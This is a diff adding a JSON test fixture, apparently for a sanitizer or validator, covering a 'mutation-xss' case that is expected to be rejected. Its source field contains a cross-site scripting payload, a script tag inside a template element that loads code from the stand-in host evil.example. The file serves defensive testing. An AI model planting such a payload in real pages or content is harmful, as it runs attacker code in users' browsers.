@@ -1,0 +1,9 @@
+{
+  "id": "mutation-xss-template-script-src",
+  "category": "mutation-xss",
+  "requirement": "PRD-15",
+  "status": "invalid",
+  "diagnostic": "E-FMT-02",
+  "source": "---\ntitle: T\n---\n\n<template><script src=\"https://evil.example/x.js\"></script></template>\n",
+  "detail": "template-wrapped remote script cannot escape the stored source"
+}
